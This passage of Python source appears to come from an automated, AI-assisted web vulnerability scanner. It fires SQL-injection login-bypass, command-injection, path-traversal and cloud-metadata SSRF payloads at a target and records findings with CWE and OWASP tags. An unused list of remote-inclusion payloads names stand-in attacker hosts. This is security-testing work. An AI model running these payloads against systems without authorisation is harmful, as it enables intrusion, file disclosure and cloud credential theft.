                        'impact': 'Potential arbitrary file upload leading to RCE',
                        'cwe': 'CWE-434',
                        'owasp': 'A04:2021 - Insecure Design'
                    })
        
        except Exception as e:
            pass
    
    async def test_auth_bypass(self):
        """Test for authentication bypass vulnerabilities"""
        self.logger.info("Testing for authentication bypass...")
        
        # SQL injection in login forms
        auth_payloads = [
            "admin'--",
            "admin' OR '1'='1'--",
            "' OR 1=1#",
            "admin' OR 'x'='x",
            "') OR ('1'='1'--"
        ]
        
        # Look for login forms
        try:
            async with self.session.get(self.target_url) as response:
                response_text = await response.text()
                
                # Check for login forms
                if any(keyword in response_text.lower() for keyword in ['login', 'signin', 'password', 'username']):
                    # Extract forms and test them
                    forms = self.extract_forms(response_text)
                    
                    for form in forms:
                        if any(field.get('type') == 'password' for field in form.get('inputs', [])):
                            await self.test_login_form(form, auth_payloads)
        
        except Exception as e:
            pass
    
    def extract_forms(self, html: str) -> List[Dict[str, Any]]:
        """Extract forms from HTML (simplified version)"""
        forms = []
        form_pattern = r'<form[^>]*>(.*?)</form>'
        
        for match in re.finditer(form_pattern, html, re.IGNORECASE | re.DOTALL):
            form_html = match.group(0)
            
            # Extract form attributes
            action_match = re.search(r'action=["\']([^"\']*)["\']', form_html, re.IGNORECASE)
            method_match = re.search(r'method=["\']([^"\']*)["\']', form_html, re.IGNORECASE)
            
            # Extract input fields
            input_pattern = r'<input[^>]*>'
            inputs = []
            for input_match in re.finditer(input_pattern, form_html, re.IGNORECASE):
                input_html = input_match.group(0)
                name_match = re.search(r'name=["\']([^"\']*)["\']', input_html, re.IGNORECASE)
                type_match = re.search(r'type=["\']([^"\']*)["\']', input_html, re.IGNORECASE)
                
                inputs.append({
                    'name': name_match.group(1) if name_match else '',
                    'type': type_match.group(1) if type_match else 'text'
                })
            
            forms.append({
                'action': action_match.group(1) if action_match else '',
                'method': method_match.group(1) if method_match else 'GET',
                'inputs': inputs
            })
        
        return forms
    
    async def test_login_form(self, form: Dict[str, Any], payloads: List[str]):
        """Test login form with authentication bypass payloads"""
        try:
            action = form.get('action', '')
            method = form.get('method', 'GET').upper()
            inputs = form.get('inputs', [])
            
            # Find username and password fields
            username_field = None
            password_field = None
            
            for input_field in inputs:
                field_name = input_field.get('name', '').lower()
                field_type = input_field.get('type', '').lower()
                
                if field_type == 'password' or 'password' in field_name:
                    password_field = input_field.get('name')
                elif 'user' in field_name or 'email' in field_name or field_name == 'login':
                    username_field = input_field.get('name')
            
            if username_field and password_field:
                for payload in payloads:
                    data = {
                        username_field: payload,
                        password_field: 'password'
                    }
                    
                    # Add other form fields
                    for input_field in inputs:
                        field_name = input_field.get('name')
                        field_type = input_field.get('type', '').lower()
                        
                        if field_name not in data and field_type not in ['submit', 'button']:
                            data[field_name] = 'test'
                    
                    # Submit form
                    form_url = urljoin(self.target_url, action) if action else self.target_url
                    
                    if method == 'POST':
                        async with self.session.post(form_url, data=data) as response:
                            await self.check_auth_bypass_response(response, payload, form_url)
                    else:
                        params = urlencode(data)
                        test_url = f"{form_url}?{params}"
                        async with self.session.get(test_url) as response:
                            await self.check_auth_bypass_response(response, payload, test_url)
        
        except Exception as e:
            pass
    
    async def check_auth_bypass_response(self, response, payload: str, url: str):
        """Check response for authentication bypass indicators"""
        try:
            response_text = await response.text()
            
            # Check for successful login indicators
            success_indicators = [
                'welcome', 'dashboard', 'logout', 'profile',
                'admin panel', 'control panel', 'settings'
            ]
            
            # Check for failed login indicators
            failure_indicators = [
                'invalid', 'incorrect', 'failed', 'error',
                'wrong', 'denied', 'unauthorized'
            ]
            
            has_success = any(indicator in response_text.lower() for indicator in success_indicators)
            has_failure = any(indicator in response_text.lower() for indicator in failure_indicators)
            
            # If we see success indicators and no failure indicators, it might be a bypass
            if has_success and not has_failure:
                self.vulnerabilities.append({
                    'type': 'Authentication Bypass',
                    'severity': 'Critical',
                    'payload': payload,
                    'evidence': 'Successful login with SQL injection payload',
                    'url': url,
                    'method': 'POST',
                    'description': 'Authentication bypass through SQL injection',
                    'impact': 'Unauthorized access to protected resources',
                    'cwe': 'CWE-287',
                    'owasp': 'A07:2021 - Identification and Authentication Failures'
                })
        
        except Exception as e:
            pass
    
    async def test_session_management(self):
        """Test for session management vulnerabilities"""
        self.logger.info("Testing session management...")
        
        try:
            async with self.session.get(self.target_url) as response:
                cookies = response.cookies
                
                for cookie in cookies:
                    # Check for insecure cookie attributes
                    if not cookie.get('secure') and self.parsed_url.scheme == 'https':
                        self.vulnerabilities.append({
                            'type': 'Insecure Cookie',
                            'severity': 'Medium',
                            'evidence': f'Cookie "{cookie.key}" missing Secure flag',
                            'url': self.target_url,
                            'description': 'Session cookie transmitted over insecure connection',
                            'impact': 'Session hijacking through man-in-the-middle attacks',
                            'cwe': 'CWE-614',
                            'owasp': 'A07:2021 - Identification and Authentication Failures'
                        })
                    
                    if not cookie.get('httponly'):
                        self.vulnerabilities.append({
                            'type': 'Missing HttpOnly Flag',
                            'severity': 'Medium',
                            'evidence': f'Cookie "{cookie.key}" missing HttpOnly flag',
                            'url': self.target_url,
                            'description': 'Session cookie accessible via JavaScript',
                            'impact': 'Session hijacking through XSS attacks',
                            'cwe': 'CWE-1004',
                            'owasp': 'A07:2021 - Identification and Authentication Failures'
                        })
        
        except Exception as e:
            pass
    
    async def test_information_disclosure(self):
        """Test for information disclosure vulnerabilities"""
        self.logger.info("Testing for information disclosure...")
        
        # Test for sensitive files
        sensitive_files = [
            'robots.txt', '.htaccess', 'web.config', 'phpinfo.php',
            'info.php', 'test.php', 'backup.sql', 'config.php',
            '.env', '.git/config', 'admin/', 'administrator/',
            'wp-admin/', 'wp-config.php', 'database.sql',
            'backup.zip', 'config.bak', '.DS_Store'
        ]
        
        for file_path in sensitive_files:
            await self.test_sensitive_file(file_path)
    
    async def test_sensitive_file(self, file_path: str):
        """Test access to sensitive files"""
        try:
            test_url = urljoin(self.target_url, file_path)
            
            async with self.session.get(test_url) as response:
                if response.status == 200:
                    response_text = await response.text()
                    
                    # Check for sensitive content indicators
                    sensitive_indicators = {
                        'robots.txt': ['disallow:', 'user-agent:'],
                        '.htaccess': ['rewriterule', 'directory'],
                        'phpinfo.php': ['php version', 'configuration'],
                        '.env': ['db_password', 'api_key', 'secret'],
                        'web.config': ['<configuration>', '<system.web>'],
                        'config.php': ['<?php', 'database', 'password'],
                        '.git/config': ['[core]', 'repositoryformatversion']
                    }
                    
                    indicators = sensitive_indicators.get(file_path.lower(), [])
                    if any(indicator.lower() in response_text.lower() for indicator in indicators):
                        self.vulnerabilities.append({
                            'type': 'Information Disclosure',
                            'severity': 'Medium',
                            'evidence': f'Sensitive file accessible: {file_path}',
                            'url': test_url,
                            'method': 'GET',
                            'description': f'Sensitive file "{file_path}" is publicly accessible',
                            'impact': 'Information leakage, system reconnaissance',
                            'cwe': 'CWE-200',
                            'owasp': 'A01:2021 - Broken Access Control'
                        })
        
        except Exception as e:
            pass    

    async def test_parameter_command_injection(self, url: str, param_name: str, param_info: Dict, target_info: Dict[str, Any]):
        """Test a specific parameter for command injection"""
        
        # Check if already tested this parameter for command injection
        test_key = f"{url}#{param_name}#command_injection"
        if test_key in self.tested_param_vulns:
            return
        self.tested_param_vulns.add(test_key)
        
        # Generate AI payloads
        ai_payloads = await self.ai_engine.generate_command_injection_payloads(target_info)
        
        # Basic command injection payloads
        basic_payloads = [
            "; whoami",
            "| id",
            "&& echo CMDINJECTION",
            "; cat /etc/passwd",
            "| type C:\\Windows\\System32\\drivers\\etc\\hosts",
            "; sleep 7",
            "& ping -c 1 127.0.0.1"
        ]
        
        all_payloads = basic_payloads + ai_payloads
        
        for payload in all_payloads:
            try:
                method = param_info.get('method', 'GET')
                
                if method == 'GET':
                    test_url = f"{url}?{param_name}={payload}"
                    
                    start_time = time.time()
                    async with self.session.get(test_url) as response:
                        response_time = time.time() - start_time
                        response_text = await response.text()
                        
                        # Check for command execution indicators
                        if await self.check_command_injection_response(response_text, response_time, payload):
                            vuln = {
                                'type': 'Command Injection',
                                'severity': 'Critical',
                                'url': test_url,
                                'parameter': param_name,
                                'payload': payload,
                                'method': method,
                                'evidence': self.get_command_evidence(response_text),
                                'description': f'Command injection vulnerability in parameter "{param_name}"',
                                'impact': 'Remote code execution, system compromise',
                                'cwe': 'CWE-78',
                                'owasp': 'A03:2021 - Injection'
                            }
                            
                            self.vulnerabilities.append(vuln)
                            self.vuln_count += 1
                            
                            # Real-time output
                            print(f"[ALERT] CRITICAL[!] VULNERABILITY FOUND #{self.vuln_count}")
                            print(f"   Type: Command Injection")
                            print(f"   URL: {test_url}")
                            print(f"   Parameter: {param_name}")
                            print(f"   Payload: {payload}")
                            print(f"   Evidence: {self.get_command_evidence(response_text)}")
                            print(f"   {'='*50}")
                            
                            break
                
                elif method == 'POST':
                    data = {param_name: payload}
                    
                    start_time = time.time()
                    async with self.session.post(url, data=data) as response:
                        response_time = time.time() - start_time
                        response_text = await response.text()
                        
                        if await self.check_command_injection_response(response_text, response_time, payload):
                            vuln = {
                                'type': 'Command Injection (POST)',
                                'severity': 'Critical',
                                'url': url,
                                'parameter': param_name,
                                'payload': payload,
                                'method': method,
                                'evidence': self.get_command_evidence(response_text),
                                'description': f'Command injection vulnerability in POST parameter "{param_name}"',
                                'impact': 'Remote code execution, system compromise',
                                'cwe': 'CWE-78',
                                'owasp': 'A03:2021 - Injection'
                            }
                            
                            self.vulnerabilities.append(vuln)
                            self.vuln_count += 1
                            
                            # Real-time output
                            print(f"[ALERT] CRITICAL[!] VULNERABILITY FOUND #{self.vuln_count}")
                            print(f"   Type: Command Injection (POST)")
                            print(f"   URL: {url}")
                            print(f"   Parameter: {param_name}")
                            print(f"   Payload: {payload}")
                            print(f"   Evidence: {self.get_command_evidence(response_text)}")
                            print(f"   {'='*50}")
                            
                            break
            
            except Exception as e:
                continue
    
    async def check_command_injection_response(self, response_text: str, response_time: float, payload: str) -> bool:
        """Check if response indicates command injection"""
        
        # More specific command execution indicators
        command_indicators = [
            'uid=0(root)', 'gid=0(root)',  # Specific Unix id output
            'nt authority\\system',  # Windows whoami
            'CMDINJECTION',  # Our test string
            'root:x:0:0:root',  # /etc/passwd format
            '# localhost name resolution',  # hosts file
            '64 bytes from 127.0.0.1'  # ping output
        ]
        
        for indicator in command_indicators:
            if indicator in response_text:
                return True
        
        # Check for time-based command injection (more strict)
        if 'sleep' in payload and response_time > 6:
            return True
        
        return False
    
    def get_command_evidence(self, response_text: str) -> str:
        """Extract command execution evidence from response"""
        
        command_indicators = [
            'uid=', 'gid=', 'groups=',
            'nt authority\\system', 'domain\\',
            'PING', 'packets transmitted',
            'root:', 'daemon:', 'bin:',
            'Windows', 'System32', 'drivers',
            'Directory of', 'Volume Serial Number',
            'Linux', 'GNU', 'kernel'
        ]
        
        for indicator in command_indicators:
            if indicator.lower() in response_text.lower():
                return f"Command execution detected: {indicator}"
        
        return "Command injection detected"
    
    async def test_parameter_lfi_rfi(self, url: str, param_name: str, param_info: Dict, target_info: Dict[str, Any]):
        """Test a specific parameter for LFI/RFI"""
        
        # Check if already tested this parameter for LFI
        test_key = f"{url}#{param_name}#lfi"
        if test_key in self.tested_param_vulns:
            return
        self.tested_param_vulns.add(test_key)
        
        # LFI payloads
        lfi_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts",
            "/etc/passwd%00",
            "php://filter/read=convert.base64-encode/resource=index.php",
            "file:///etc/passwd",
            "../../../../../../etc/passwd",
            "..\\..\\..\\..\\..\\..\\windows\\win.ini"
        ]
        
        # RFI payloads (be careful with these)
        rfi_payloads = [
            "http://evil.com/shell.txt",
            "https://pastebin.com/raw/malicious",
            "ftp://attacker.com/backdoor.php"
        ]
        
        all_payloads = lfi_payloads  # Only test LFI for safety
        
        for payload in all_payloads:
            try:
                method = param_info.get('method', 'GET')
                
                if method == 'GET':
                    test_url = f"{url}?{param_name}={payload}"
                    
                    async with self.session.get(test_url) as response:
                        response_text = await response.text()
                        
                        # Check for file inclusion indicators
                        if await self.check_lfi_response(response_text):
                            vuln = {
                                'type': 'Local File Inclusion (LFI)',
                                'severity': 'High',
                                'url': test_url,
                                'parameter': param_name,
                                'payload': payload,
                                'method': method,
                                'evidence': self.get_lfi_evidence(response_text),
                                'description': f'LFI vulnerability in parameter "{param_name}"',
                                'impact': 'Unauthorized file access, information disclosure',
                                'cwe': 'CWE-22',
                                'owasp': 'A01:2021 - Broken Access Control'
                            }
                            
                            self.vulnerabilities.append(vuln)
                            self.vuln_count += 1
                            
                            # Real-time output
                            print(f"[ALERT][!] VULNERABILITY FOUND #{self.vuln_count}")
                            print(f"   Type: Local File Inclusion (LFI)")
                            print(f"   URL: {test_url}")
                            print(f"   Parameter: {param_name}")
                            print(f"   Payload: {payload}")
                            print(f"   Evidence: {self.get_lfi_evidence(response_text)}")
                            print(f"   {'='*50}")
                            
                            break
                
                elif method == 'POST':
                    data = {param_name: payload}
                    
                    async with self.session.post(url, data=data) as response:
                        response_text = await response.text()
                        
                        if await self.check_lfi_response(response_text):
                            vuln = {
                                'type': 'Local File Inclusion (LFI) - POST',
                                'severity': 'High',
                                'url': url,
                                'parameter': param_name,
                                'payload': payload,
                                'method': method,
                                'evidence': self.get_lfi_evidence(response_text),
                                'description': f'LFI vulnerability in POST parameter "{param_name}"',
                                'impact': 'Unauthorized file access, information disclosure',
                                'cwe': 'CWE-22',
                                'owasp': 'A01:2021 - Broken Access Control'
                            }
                            
                            self.vulnerabilities.append(vuln)
                            self.vuln_count += 1
                            
                            # Real-time output
                            print(f"[ALERT][!] VULNERABILITY FOUND #{self.vuln_count}")
                            print(f"   Type: Local File Inclusion (LFI) - POST")
                            print(f"   URL: {url}")
                            print(f"   Parameter: {param_name}")
                            print(f"   Payload: {payload}")
                            print(f"   Evidence: {self.get_lfi_evidence(response_text)}")
                            print(f"   {'='*50}")
                            
                            break
            
            except Exception as e:
                continue
    
    async def check_lfi_response(self, response_text: str) -> bool:
        """Check if response indicates LFI"""
        
        lfi_indicators = [
            'root:', 'daemon:', 'bin:', 'sys:', 'adm:',  # /etc/passwd
            '[drivers]', '[fonts]', 'windows',  # Windows files
            '# This file', '# /etc/passwd',  # File headers
            'for 16-bit app support',  # win.ini
            '<?php', '<?=',  # PHP source code
            'PK'  # ZIP file header (base64 encoded files)
        ]
        
        for indicator in lfi_indicators:
            if indicator in response_text:
                return True
        
        return False
    
    def get_lfi_evidence(self, response_text: str) -> str:
        """Extract LFI evidence from response"""
        
        lfi_indicators = [
            'root:', 'daemon:', 'bin:',
            '[drivers]', '[fonts]',
            '# This file', '# /etc/passwd',
            'for 16-bit app support',
            '<?php', '<?='
        ]
        
        for indicator in lfi_indicators:
            if indicator in response_text:
                return f"File content detected: {indicator}"
        
        return "File inclusion detected"
    
    async def test_parameter_ssrf(self, url: str, param_name: str, param_info: Dict, target_info: Dict[str, Any]):
        """Test a specific parameter for SSRF"""
        
        # Check if already tested this parameter for SSRF
        test_key = f"{url}#{param_name}#ssrf"
        if test_key in self.tested_param_vulns:
            return
        self.tested_param_vulns.add(test_key)
        
        # Generate AI payloads
        ai_payloads = await self.ai_engine.generate_ssrf_payloads(target_info)
        
        # Basic SSRF payloads
        basic_payloads = [
            "http://127.0.0.1:80",
            "http://localhost:22",
            "http://169.254.169.254/latest/meta-data/",  # AWS metadata
            "http://metadata.google.internal/computeMetadata/v1/",  # GCP metadata
            "http://169.254.169.254/metadata/instance",  # Azure metadata
            "file:///etc/passwd",
            "gopher://127.0.0.1:25/",
            "dict://127.0.0.1:11211/",
            "http://0.0.0.0:80",
            "http://[::1]:80",
            "http://127.1:80",
            "http://127.0.1:80"
        ]
        
        all_payloads = basic_payloads + ai_payloads
        
        for payload in all_payloads:
            try:
                method = param_info.get('method', 'GET')
                
                if method == 'GET':
                    test_url = f"{url}?{param_name}={payload}"
                    
                    async with self.session.get(test_url) as response:
                        response_text = await response.text()
                        
                        # Check for SSRF indicators
                        if await self.check_ssrf_response(response_text):
                            vuln = {
                                'type': 'Server-Side Request Forgery (SSRF)',
                                'severity': 'High',
                                'url': test_url,
                                'parameter': param_name,
                                'payload': payload,
                                'method': method,
                                'evidence': self.get_ssrf_evidence(response_text),
                                'description': f'SSRF vulnerability in parameter "{param_name}"',
                                'impact': 'Internal network access, cloud metadata exposure',
                                'cwe': 'CWE-918',
                                'owasp': 'A10:2021 - Server-Side Request Forgery'
                            }
                            
                            self.vulnerabilities.append(vuln)
                            self.vuln_count += 1
                            
                            # Real-time output
                            print(f"[ALERT][!] VULNERABILITY FOUND #{self.vuln_count}")
                            print(f"   Type: Server-Side Request Forgery (SSRF)")
                            print(f"   URL: {test_url}")
                            print(f"   Parameter: {param_name}")
                            print(f"   Payload: {payload}")
                            print(f"   Evidence: {self.get_ssrf_evidence(response_text)}")
                            print(f"   {'='*50}")
                            
                            break
                
                elif method == 'POST':
                    data = {param_name: payload}
                    
                    async with self.session.post(url, data=data) as response:
                        response_text = await response.text()
                        
                        if await self.check_ssrf_response(response_text):
                            vuln = {
                                'type': 'Server-Side Request Forgery (SSRF) - POST',
                                'severity': 'High',
                                'url': url,
                                'parameter': param_name,
                                'payload': payload,
                                'method': method,
                                'evidence': self.get_ssrf_evidence(response_text),
                                'description': f'SSRF vulnerability in POST parameter "{param_name}"',
                                'impact': 'Internal network access, cloud metadata exposure',
                                'cwe': 'CWE-918',
                                'owasp': 'A10:2021 - Server-Side Request Forgery'
                            }
                            
                            self.vulnerabilities.append(vuln)
                            self.vuln_count += 1
                            
                            # Real-time output
                            print(f"[ALERT][!] VULNERABILITY FOUND #{self.vuln_count}")
                            print(f"   Type: Server-Side Request Forgery (SSRF) - POST")
                            print(f"   URL: {url}")
                            print(f"   Parameter: {param_name}")
                            print(f"   Payload: {payload}")
                            print(f"   Evidence: {self.get_ssrf_evidence(response_text)}")
                            print(f"   {'='*50}")
                            
                            break
            
            except Exception as e:
                continue
    
    async def check_ssrf_response(self, response_text: str) -> bool:
        """Check if response indicates SSRF"""
        
        ssrf_indicators = [
            'ami-id', 'instance-id', 'security-credentials',  # AWS metadata
            'computeMetadata', 'service-accounts',  # GCP metadata
            'Microsoft Azure', 'subscription-id',  # Azure metadata
            'SSH-2.0', 'OpenSSH',  # SSH services
            'root:', 'daemon:', 'bin:',  # File access via file://
            'HTTP/1.1 200 OK', 'Server:',  # HTTP responses
            'Connection refused', 'Connection timeout'  # Network errors
        ]
        
        for indicator in ssrf_indicators:
            if indicator in response_text:
                return True
        
        return False
    
    def get_ssrf_evidence(self, response_text: str) -> str:
        """Extract SSRF evidence from response"""
        
        ssrf_indicators = [
            'ami-id', 'instance-id', 'security-credentials',
            'computeMetadata', 'service-accounts',
            'Microsoft Azure', 'subscription-id',
            'SSH-2.0', 'OpenSSH',
            'root:', 'daemon:', 'bin:',
            'HTTP/1.1 200 OK', 'Server:'
        ]
        
        for indicator in ssrf_indicators:
            if indicator in response_text:
                return f"SSRF detected: {indicator}"
        
        return "SSRF vulnerability detected"
    
    async def test_form_vulnerabilities(self, form: Dict[str, Any], target_info: Dict[str, Any]):
        """Test a specific form for vulnerabilities"""
        
        form_url = form['action']
        method = form['method']
        inputs = form['inputs']
        
        if not inputs:
            return
        
        # Test each input field in the form
        for input_field in inputs:
            param_name = input_field['name']
            if not param_name:
                continue
            
            param_info = {
                'method': method,
                'type': input_field['type'],
                'form_action': form_url
            }
            
            # Test this form parameter for all vulnerability types
            await self.test_parameter_sql_injection(form_url, param_name, param_info, target_info)
            await self.test_parameter_xss(form_url, param_name, param_info, target_info)
            await self.test_parameter_command_injection(form_url, param_name, param_info, target_info)
            await self.test_parameter_lfi_rfi(form_url, param_name, param_info, target_info)
            await self.test_parameter_ssrf(form_url, param_name, param_info, target_info)
    
    async def test_url_vulnerabilities(self, url: str, target_info: Dict[str, Any]):
        """Test a specific URL for vulnerabilities"""
        
        try:
            async with self.session.get(url) as response:
                response_text = await response.text()
                headers = response.headers
                
                # Check for information disclosure
                await self.check_url_info_disclosure(url, response_text, headers)
                
                # Check for security headers
                await self.check_security_headers(url, headers)
                
        except Exception as e:
            pass
    
    async def check_url_info_disclosure(self, url: str, response_text: str, headers: Dict):
        """Check URL for information disclosure"""
        
        # Check for sensitive information in response
        sensitive_patterns = [
            'password', 'secret', 'key', 'token', 'api_key',
            'database', 'config', 'admin', 'root', 'debug',
            'error', 'exception', 'stack trace', 'sql error'
        ]
        
        for pattern in sensitive_patterns:
            if pattern.lower() in response_text.lower():
                vuln = {
                    'type': 'Information Disclosure',
                    'severity': 'Medium',
                    'url': url,
                    'evidence': f'Sensitive information detected: {pattern}',
                    'description': f'Sensitive information exposed in response',
                    'impact': 'Information leakage, system reconnaissance',
                    'cwe': 'CWE-200',
                    'owasp': 'A01:2021 - Broken Access Control'
                }
                
                self.vulnerabilities.append(vuln)
                self.vuln_count += 1
                
                # Real-time output
                print(f"[ALERT][!] VULNERABILITY FOUND #{self.vuln_count}")
                print(f"   Type: Information Disclosure")
                print(f"   URL: {url}")
                print(f"   Evidence: Sensitive information detected: {pattern}")
                print(f"   {'='*50}")
                
                break  # Only report once per URL
    
    async def check_security_headers(self, url: str, headers: Dict):
        """Check for missing security headers"""
        
        required_headers = {
            'X-Frame-Options': 'Medium',
            'X-XSS-Protection': 'Low',
            'X-Content-Type-Options': 'Low',
            'Strict-Transport-Security': 'Medium',
            'Content-Security-Policy': 'High'
        }
        
        missing_headers = []
        for header, severity in required_headers.items():
            if header not in headers:
                missing_headers.append((header, severity))
        
        if missing_headers:
            for header, severity in missing_headers:
                vuln = {
                    'type': 'Missing Security Header',
                    'severity': severity,
                    'url': url,
                    'evidence': f'Missing security header: {header}',
                    'description': f'Security header "{header}" is not implemented',
                    'impact': 'Increased vulnerability to various attacks',
                    'cwe': 'CWE-16',
                    'owasp': 'A05:2021 - Security Misconfiguration'
                }
                
                self.vulnerabilities.append(vuln)
                self.vuln_count += 1
                
                # Real-time output (only for high severity)
                if severity == 'High':
                    print(f"[ALERT][!] VULNERABILITY FOUND #{self.vuln_count}")
                    print(f"   Type: Missing Security Header")
                    print(f"   URL: {url}")
                    print(f"   Evidence: Missing security header: {header}")
                    print(f"   {'='*50}") 
   
    def is_xss_vulnerable(self, payload: str, response_text: str) -> bool:
        """Check if XSS payload is actually reflected and executable"""
        
        # Check if payload is reflected without encoding
        if payload in response_text:
            return True
        
        # Check for partial reflection (script tags, event handlers)
        dangerous_parts = ['<script', 'javascript:', 'onerror=', 'onload=', 'alert(']
        for part in dangerous_parts:
            if part in payload.lower() and part in response_text.lower():
                return True
        
        # Check for encoded but still dangerous reflection
        encoded_payload = payload.replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;')
        if encoded_payload in response_text:
            # If encoded, it's likely not vulnerable
            return False
        
        return False